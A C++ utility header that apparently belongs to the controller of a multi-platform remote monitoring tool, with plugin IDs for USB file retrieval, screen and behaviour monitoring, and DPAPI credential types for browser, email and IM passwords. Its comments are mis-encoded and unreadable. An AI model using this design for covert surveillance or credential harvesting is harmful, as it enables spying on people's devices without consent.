//---------------------------------------------------------------------------

#ifndef UtilityH
#define UtilityH
//---------------------------------------------------------------------------
#include <cassert>
#include "maindlg.h"
#include <vector>
#include <string>
#include <QtGui>
#include "targetdlg.h"

#include <shellapi.h>


#define CACHE_MINDISKFREESIZE   50
#define USB_MAXDIRLEVEL         8
#define USB_SECRAPIDTIME        20
#define USB_SECGOWITHTIME       3

// Ϊ��ʡȥ�����ķ��գ���������˼򵥵���������
//
#define PLUGIN_ZERO                 (0)                 // פ�����
#define PLUGIN_ONE					(1)					// ƽ̨ͨ�Ų��
#define PLUGIN_TWO					(2)					// �û���Ϊ��ز��	
#define PLUGIN_THREE				(3)					// USB�ļ���ȡ���
#define PLUGIN_FOUR					(4)					// ��Ļ��ز��
#define PLUGIN_FIVE					(5)					// �������Ϣ��ȡ���

// typedef some enum variable
//
typedef enum
{
	IEAUTO = 0,
	IEPASS,
	EMAIL,
	IMS
}DpapiType;

typedef enum 
{
	FO_CREATEFILE=0,
	FO_OPENFILE,
	FO_DELETEFILE,
	FO_MOVEFILE,
	FO_COPYFILE,
	FO_CREATEDIRECTORY,
	FO_REMOVEDIRECTORY

}FileOpType;

typedef BOOL (WINAPI *pWow64DisableWow64FsRedirection)(PVOID* oldValue);
typedef BOOL (WINAPI *pWow64RevertWow64FsRedirection)(PVOID oldValue);

std::string GetTimeString(LONG time);
std::string GetDateString(LONG time);
std::string __fastcall GenerateLogicStr(LONG unitmask);

std::string  ConvertPluginIdToLang(ULONG pid);
std::wstring  ConvertPluginIdToLangW(ULONG pid);
DpapiType   ConvertStrToDpapiType(std::string dpapiStr);
PCHAR       ConvertDpapiTypeToLang(DpapiType dType);
PWCHAR      ConvertDpapiTypeToLangW(DpapiType dType);
std::string  ConvertFileOpTypeToStr(FileOpType opType);
std::string  ConvertDiskTypeToStr(UINT diskType);

//
//
void SetStatusInfoA(STATUS_LEVEL sl, const char* info);
void SetStatusInfoExA(STATUS_LEVEL sl, const char* format,...);
void SetStatusInfoW(STATUS_LEVEL sl, const wchar_t* info);
void SetStatusInfoExW(STATUS_LEVEL sl, const wchar_t* format,...);
void SetTarStatusInfoExW(STATUS_LEVEL sl, Target *tarBlock, const wchar_t* format,...);
void MsgBoxInfoA(HWND hWnd, const char *info);
void MsgBoxInfoW(HWND hWnd, const wchar_t *info);
void MsgBoxInfoExW(HWND hWnd, const wchar_t *format,...);
void MsgBoxErrorW(HWND hWnd, const wchar_t *info);
void MsgBoxErrorExW(HWND hWnd, const wchar_t *format,...);

int MsgBoxExW(HWND hWnd, UINT uType, const wchar_t *caption, const wchar_t *format, ...);

const wchar_t * ExtractFileNameW(const wchar_t *lpwzPath);
std::wstring ExtractFilePathW(wchar_t *lpwzPath);

//time_t ConvertDataTimeToTimeT(TDateTime dt);

//
//
void ParamConvert(char * param, BOOLEAN direction);
void CryptData(BYTE *data, int len);
std::vector<std::string> SplitString(const std::string & s, const std::string & sep, bool suppressBlanks=true);

std::string ConvertBuildNumberToStr(ULONG osBuildNumber);

void ConvertSpaceToTab(char * param);
void ConvertTabToSpace(char * param);

std::string GetBase64FromAnsi(std::string aStr);
std::string GetBase64FromWide(std::wstring wStr);
std::wstring GetWideFromBase64(std::string base64Str);
char *GetStringFromWBase64(const char * base64);

// ר��
//
std::string ConvertErrorIdToStr(int lastErrCode);
std::wstring ConvertErrorIdToStrW(int lastErrCode);

std::vector<PFILE_BLOCK> SplitSearchString(const std::string & s,
                                           const std::string & outsep,
                                           const std::string & insep);

std::vector<PFILE_BLOCK> SplitDirString(const std::string & s,
                                        const std::string & outsep,
                                        const std::string & insep);

TaskDirect ConvertStrToTaskDirect(std::string taskStr);
char* ConvertTaskDirectToStr(TaskDirect taskDirect);
std::wstring ConvertTaskDirectToLangW(TaskDirect taskDirect);

bool CheckAndCreateDirectory(const char *dirPath);

std::string PathMergeA(std::string aniPrepPath, std::string aniSuffixPath);
std::wstring PathMergeW(std::wstring widPrepPath, std::wstring widSuffixPath);

std::wstring GenerateLocalFileSavedPath(std::wstring widTarLocalPath,
										std::wstring widRemoteFilePath,
										bool isMac);

std::string ConvertTaskStatusToLangA(TaskStatus taskStatus);
std::wstring ConvertTaskStatusToLangW(TaskStatus taskStatus);

int ReadDataFromLocalFile(FileTask  *fileTask,
                          ULONG      startPos,

                          char      *readBuf,

                          ULONG     dataLen,

                          int       *byteReaded);
                          
int SaveDataToLocalFile(FileTask    *fileTask,
                        ULONG       startPos,
                        const char  *data,
                        ULONG       dataLen);

std::wstring __fastcall CreateSubSimulateDir(std::wstring widSimulatePath, std::wstring widTarRealpath, bool bMac);

VOID FreePluginCxt(PPLUGIN_CXT lpPluginCxt);

//
// ����
//

// ��ȡ��ǰʱ���ַ���
std::string TGetCurrentTime();

// string -> wstring
std::wstring AnsiToWide(std::string);

// wstring -> string
std::string WideToAnsi(std::wstring);

// PathMerge -> mac ver
std::wstring PathMergeMac(std::wstring widPrepPath, std::wstring widSuffixPath);

// ExtractFileNameW -> mac ver
const wchar_t * ExtractFileNameMac(const wchar_t *lpwzPath);

// ��ȡǰ 7 λ�ֻ���
std::string GetPhoneNumberPrefix(std::string number);

// ��ȡ���������ļ���
std::wstring GetExePath();

// �����ļ���
bool SHCopy(LPCWSTR from, LPCWSTR to);

// ɾ���ļ���
bool SHDel(LPCWSTR dir);

// ���ļ����õ���Ӧ��ͼ��
HICON GetIconFromFileName(LPCWSTR wzFileName);

// ����·���ж�ָ���ļ��Ƿ����ļ�����
bool FileInDir(const std::wstring& filePath, const std::wstring& dirPath);

// ��·���õ��ļ���
std::wstring GetNameFromPath(std::wstring path, WCHAR dot);

// ��ȡʱ���ַ���
std::wstring GetTimeFromLongLong(LONGLONG time);

// �����ͱ���д�������ļ�
void WritePolicyToLocal(LPCWSTR wzSection, LPCWSTR wzKey, ULONG nValue, LPCWSTR wzIniPath);

// �������ļ��ж������ͱ���
ULONG ReadValueFromLocal(LPCWSTR wzSection, LPCWSTR wzKey, LPCWSTR wzIniPath);

// �������ļ��ж����ַ���
std::wstring ReadStringPolicyFromLocal(LPCWSTR wzSection, LPCWSTR wzKey, LPCWSTR wzIniPath);

// ���ַ���д�������ļ�
void WriteStringPolicyToLocal(LPCWSTR wzSection, LPCWSTR wzKey, LPCWSTR value, LPCWSTR wzIniPath);

//! ��ϵͳ��Ż�ȡϵͳ����
SystemType GetSystemType(DWORD dwOsBuildNumber);

//! �ж��Ƿ�Ϊ Unix ϵ�� ( IOS �� Mac �� Android )
BOOL UnixLike(Target* tar);

//! �ж�ϵͳ�Ƿ�Ϊ 64 λ
inline bool Is64Bit()
{
	typedef void (WINAPI *LPFN_PGNSI)(LPSYSTEM_INFO); 

	LPFN_PGNSI pGNSI = (LPFN_PGNSI ) GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo"); 
	if ( !pGNSI )
	{
		return FALSE;
	}

	bool bWin64 = false;
	SYSTEM_INFO si;
	pGNSI(&si);

	switch ( si.wProcessorArchitecture )
	{
	case PROCESSOR_ARCHITECTURE_INTEL:
		break;
	case PROCESSOR_ARCHITECTURE_AMD64:
	case PROCESSOR_ARCHITECTURE_IA64:

		bWin64 = true;
		break;
	case PROCESSOR_ARCHITECTURE_UNKNOWN:
		break;
	}
	return bWin64;
}

// ���ָ��Ŀ¼���ļ��Ƿ����
inline BOOL Exist(std::wstring lpwzFilePath)
{
	DWORD dwResult = GetFileAttributesW(lpwzFilePath.c_str());

	if ( INVALID_FILE_ATTRIBUTES == dwResult
		&& ERROR_FILE_NOT_FOUND == GetLastError() )
	{
		return FALSE;
	}

	return TRUE;
}

BOOL MobileDevice( Target* tar );

inline QString GetIconPath(Target* tar)
{
	if ( tar->tarStatus == TARONLINE )
	{
		switch ( tar->m_sysType )
		{
		case SYSTEM_WINDOWS:
			return ":/image/windows_online.png";
			break;
		case SYSTEM_MACOSX:
			return ":/image/mac_online.png";
			break;
		case SYSTEM_IOS:

			if ( L"iPad" == GetWideFromBase64(tar->aniComputerNameBase64).substr(0, 4) )
			{
				return ":/image/ipad_online.png";
			}
			else
			{
				return ":/image/iphone_online.png";
			}

			break;
		case SYSTEM_ANDROID:
			return ":/image/android_online.png";
			break;
		}
	}
	else
	{
		switch ( tar->m_sysType )
		{
		case SYSTEM_WINDOWS:
			return ":/image/windows_offline.png";
			break;
		case SYSTEM_MACOSX:
			return ":/image/mac_offline.png";
			break;
		case SYSTEM_IOS:

			if ( L"iPad" == GetWideFromBase64(tar->aniComputerNameBase64).substr(0, 4) )
			{
				return ":/image/ipad_offline.png";
			}
			else
			{
				return ":/image/iphone_offline.png";
			}

			break;
		case SYSTEM_ANDROID:
			return ":/image/android_offline.png";
			break;
		}
	}

	return "";
}

inline void CenterWindow(QWidget& dlg)
{
	int screenWidth = QApplication::desktop()->availableGeometry().width();
	int screenHeight = QApplication::desktop()->availableGeometry().height();

	dlg.move((screenWidth-dlg.width())/2, (screenHeight-dlg.height())/2);
}

// �õ�ָ�����ݵĸ��ڵ�
inline QTreeWidgetItem* GetParentItem(QTreeWidget* tree, std::wstring text)
{
	QTreeWidgetItem* parent = NULL;

	for ( int i = 0; i < tree->topLevelItemCount(); ++i )
	{
		QTreeWidgetItem* item = tree->topLevelItem(i);

		if ( item->text(0).toStdWString() == text )
		{
			parent = item;
			break;
		}
	}

	return parent;
}

inline QTreeWidgetItem* GetParentDirItem(QTreeWidget* tree, std::wstring text)
{
	QTreeWidgetItem* parent = NULL;

	for ( int i = 0; i < tree->topLevelItemCount(); ++i )
	{
		QTreeWidgetItem* item = tree->topLevelItem(i);

		std::wstring parentDir = item->text(0).toStdWString();
		if ( text == parentDir || FileInDir(text, parentDir) )
		{
			parent = item;
			break;
		}
	}

	return parent;
}

inline void __TRACE(const wchar_t* format, ...)
{
#ifdef _DEBUG
	va_list vlArgs;
	WCHAR tzText[1024];
	va_start(vlArgs, format);
	wvsprintf(tzText, format, vlArgs);
	OutputDebugString(tzText);
	va_end(vlArgs);
#endif
}

inline std::wstring Utf8ToWide(std::string str)
{
	WCHAR buffer[1024] = {0};
	MultiByteToWideChar(CP_UTF8, NULL, str.c_str(), -1, buffer, 1024);
	return std::wstring(buffer);
}

inline bool XorFile(const std::wstring& srcFile, const std::wstring dstFile, char key)
{
	bool ret = false;

	HANDLE srcFileHandle = CreateFileW(
		srcFile.c_str(), 
		GENERIC_READ, 
		FILE_SHARE_READ, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL);

	if ( INVALID_HANDLE_VALUE == srcFileHandle )
	{
		__TRACE(L"[XorFile] CreateFileW Failed. [%d] [%s].\r\n", GetLastError(), srcFile.c_str());
		return false;
	}

	HANDLE dstFileHandle = CreateFileW(
		dstFile.c_str(),
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if ( INVALID_HANDLE_VALUE == dstFileHandle )
	{
		__TRACE(L"[XorFile] CreateFileW Failed. [%d] [%s].\r\n", GetLastError(), dstFile.c_str());
		CloseHandle(srcFileHandle);
		return false;
	}

	int fileSize = GetFileSize(srcFileHandle, NULL);
	PBYTE buffer = new BYTE[fileSize];

	DWORD dwRead = 0;
	ReadFile(srcFileHandle, buffer, fileSize, &dwRead, NULL);
	if ( fileSize != dwRead )
	{
		__TRACE(L"[XorFile] ReadFile Failed. [%d] [%d].\r\n", fileSize, dwRead);
		goto __uninit;
	}

	for ( int i = 0; i < dwRead; ++i )
		buffer[i] ^= key;

	DWORD dwWrite = 0;
	WriteFile(dstFileHandle, buffer, dwRead, &dwWrite, NULL);

	if ( dwWrite != dwRead )
	{
		__TRACE(L"[XorFile] WriteFile Failed. [%d] [%d].\r\n", dwRead, dwWrite);
		goto __uninit;
	}

	ret = true;

__uninit:
	delete [] buffer;
	CloseHandle(srcFileHandle);
	CloseHandle(dstFileHandle);

	return ret;
}

inline void FileListViewClear(QTableWidget* table)
{
	for (int i = 0; i < table->rowCount(); i++)
	{
		QTableWidgetItem* item = table->item(i, 0);
		PFILE_BLOCK fileBlock = (PFILE_BLOCK)item->data(Qt::UserRole).toUInt();

		if (fileBlock)
		{
			delete fileBlock;
		}

	}

	table->clearContents();
	table->setRowCount(0);
}

inline std::wstring ConvertFileChangeStatusToStr(ULONG fileChangeType)
{
	switch ( fileChangeType )
	{
	case FILE_ACTION_ADDED:
		return L"�����ļ�";
	case FILE_ACTION_REMOVED:
		return L"ɾ���ļ�";
	case FILE_ACTION_MODIFIED:
		return L"�޸��ļ�";
	case FILE_ACTION_RENAMED_OLD_NAME:
		return L"�������ļ�";
	case FILE_NOTIFY_CHANGE_LAST_WRITE:
		return L"�������ļ�";
	}

	return L"δ�������";
}

inline bool FileExist(const std::wstring& file)
{
	HANDLE hf = CreateFileW(
		file.c_str(), FILE_GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if ( INVALID_HANDLE_VALUE == hf )
	{
		__TRACE(L"[FileExist] File not exist.[%s] [%d]\r\n", file.c_str(), GetLastError());
		return false;
	}

	CloseHandle(hf);
	return true;
}

template<typename T>
void SetName(T* widget, std::wstring iniPath, QWidget* parent)
{
	QList<T*> children = parent->findChildren<T*>();

	for ( int i = 0; i < children.size(); ++i )
	{
		T* label = children.at(i);
		std::wstring text = ReadStringPolicyFromLocal(L"Text", label->objectName().toStdWString().c_str(), iniPath.c_str());

		if ( text != L"" && label->objectName() != "" )
			label->setText(QString::fromStdWString(text));

		qDebug() << label->text();

		WriteStringPolicyToLocal(L"Text", label->objectName().toStdWString().c_str(), label->text().toStdWString().c_str(), iniPath.c_str());
	}
}

inline void InitCustomText(QWidget* widget)
{
	std::wstring iniPath = GetExePath() + L"\\Config\\" + widget->objectName().toStdWString() + L".ini";
	QLabel* label = NULL;
	SetName(label, iniPath, widget);
	QCheckBox* chkBox = NULL;
	SetName(chkBox, iniPath, widget);
	QPushButton* pushBtn = NULL;
	SetName(pushBtn, iniPath, widget);
	QRadioButton* radioBtn = NULL;
	SetName(radioBtn, iniPath, widget);
	QLineEdit* edit = NULL;
	SetName(edit, iniPath, widget);
}
                                
#endif
